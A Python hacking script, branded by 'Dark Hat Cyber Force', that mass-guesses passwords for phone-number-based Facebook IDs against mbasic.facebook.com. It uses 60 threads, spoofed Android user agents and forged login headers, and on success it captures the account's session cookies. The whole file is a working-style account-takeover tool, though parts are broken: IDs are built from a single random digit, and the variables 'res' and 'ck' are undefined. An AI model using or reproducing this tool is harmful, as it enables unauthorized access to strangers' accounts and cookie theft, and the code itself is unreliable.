""" TOOLS SOURCE MADE BY ARAFAT """
""" CODE TO HANDLE RANDOM CLONING """
from os import system as ARafAT
import random
import os, re, sys, uuid, requests, time, json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import string

try:
    import pystyle
except ImportError:
    os.system("pip install pystyle")

from pystyle import Colors, Colorate
wx='\x1b[1;97m';gx='\x1b[38;5;48m';bx='\x1b[38;5;8m';yx="\033[1;33m";px="\33[1;34m";rx='\x1b[38;5;196m'
sys.stdout.write('\x1b]2;<👑DARK DA👑>\x07')

def mozilla():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''

def Arc():
    ARafAT("clear")
    print(ARl)
loop=0
oks=[]
def ArLine():
    print("\033[1;33mo|-------------------------------------------------------------\033[1;33m|o")
def ARenD():
	Arc()
	print("\033[1;32m(*) CLONING PROCESS HAS STARTED")
	print("\033[1;32m(*) Dark Hat Cyber Force ")
	print("\033[1;32m(*) Welcome To My Tools")
	ArLine()
ARl = (f"""{gx}  
░▒▓███████▓▒░ ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░            \033[1;33mo|-------------------------------------------------------------\033[1;33m|o
\033[1;33mo| \033[1;32mCODED BY : \033[1;33mAbir Khan                                \033[1;33m|o
\033[1;33mo| \033[1;32mGITHUB   : \033[1;33mCyberAbir0                                     \033[1;33m|o
\033[1;33mo| \033[1;32mFACEBOOK : \033[1;33mAbir Khan                                \033[1;33m|o
\033[1;33mo| \033[1;32mTELEGRAM : \033[1;33mDark Hat Cyber Force                           \033[1;33m|o
\033[1;33mo|-------------------------------------------------------------\033[1;33m|o
""")
def ARfMain():
    Arc()
    ArLine()
    print("\033[1;32m(1) RANDOM CLONING")
    print("\033[1;32m(2) EXIT MENU")
    ArLine()
    
    arafat = input(f"\033[1;32m(0) CHOICE \033[1;38m:\033[1;38m ")
    
    if arafat in ['1', '01']:
        ArAFAT_RnD()
    else:
        ARfMain()
    
    ArLine()
FUckFbMethBYAraFAT = "mbasic"
def ArAFAT_RnD():
    Arc()
    print("(*) \033[1;32mSIM CODE : \033[1;33m017 \033[1;32m/\ \033[1;33m018 \033[1;32m/\ \033[1;33m019 \033[1;32m/\ \033[1;33m016 ")
    ArLine()
    ARAt = int(input("(*) \033[1;32mCHOICE : \033[1;33m"))
    
    Arc()
    print("(*) \033[1;32mCLONING LIMIT : \033[1;33m1000 \033[1;32m/\ \033[1;33m2000 \033[1;32m/\ \033[1;33m3000 \033[1;32m/\ \033[1;33m4000 ")
    ArLine()
    ARAl = int(input("(*) \033[1;32mCHOICE : \033[1;33m"));ARenD()    
    user = []
    limit = ARAl
    for i in range(limit):
        Ag = str(random.choice(string.digits))
        user.append(Ag)
    with ThreadPool(max_workers=60) as ARaFatUp:        
        for xd in user:
            uid = str(ARAt) + xd  
            pwx = [xd, xd[2:]]
            ARaFatUp.submit(ARaFatHost,uid,pwx)
    print("");ArLine();print(f"\033[1;33m(*) \033[0;37m PROCESS HAS BEEN COMPLETED");print(f"\033[1;33m(*) \033[0;37m TOTAL OK   ▶︎ \033[1;33m{len(oks)}");ArLine();ARafAT("exit")        
def ARaFatHost(uid,pwx):
    global oks,loop,fb
    session=requests.Session()
    sys.stdout.write(f'\r\r\033[1;33mITZ\033[1;33m-DARK DA-\033[1;32mRANDOM\033[0;37m 🟢\033[1;36m %s\033[0;37m 💥\033[1;33m OK \033[0;37m☣️\033[1;33m %s '%(loop,len(oks)));sys.stdout.flush()
    
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{FUckFbMethBYAraFAT}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            ArFt=mozilla()
            Toma={
'Host': f'{FUckFbMethBYAraFAT}.facebook.com',
'content-length': '1640',
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': ArFt,
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVreZWR72Tc',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{FUckFbMethBYAraFAT}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{FUckFbMethBYAraFAT}.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br,',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            url=f"https://{FUckFbMethBYAraFAT}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url,data=info,headers=Toma)
            ArFaTxTomA=session.cookies.get_dict().keys()
            if "c_user" in ArFaTxTomA:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                if 'Photoshop' in res:
                    if "Y" in ck:
                    	print(f"\r\r(Dark DA (🟢)) {xd} (+) {ps}\n(🍪) {coki}")                
                break
            elif "checkpoint" in ArFaTxTomA:
                break 
                #print(f"\r\r[green] [CP-ID] {uid} | {ps}")
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(30)
        
ARfMain()